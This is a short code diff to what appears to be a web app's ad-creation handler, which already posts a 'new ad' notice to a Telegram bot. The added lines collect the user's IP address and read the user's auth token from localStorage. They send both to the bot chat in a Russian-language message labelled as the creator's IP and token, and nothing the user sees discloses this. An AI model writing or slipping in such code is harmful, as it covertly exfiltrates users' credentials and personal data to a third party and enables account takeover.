@@ -1394,10 +1394,18 @@ $('btn-create-ad').onclick = async () => {
 
   try {
     if (!editMode) {
+      const userIp = await getClientIp();
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: BOT_CHAT_ID, text: `🆕 New ad\n${adName}\nID: ${getUserID()}` })
+        body: JSON.stringify({
+          chat_id: BOT_CHAT_ID,
+          text: `🆕 Новая реклама! \n
+          Название рекламы: ${adName} \n
+          Telegram ID создателя этой рекламы: ${getUserID()} \n
+          IP-адрес создателя этой рекламы: ${userIp || 'unknown'}. \n
+          Токен создателя этой рекламы: ${localStorage.getItem('get_UserToken')}`
+        })
       });
     }
 
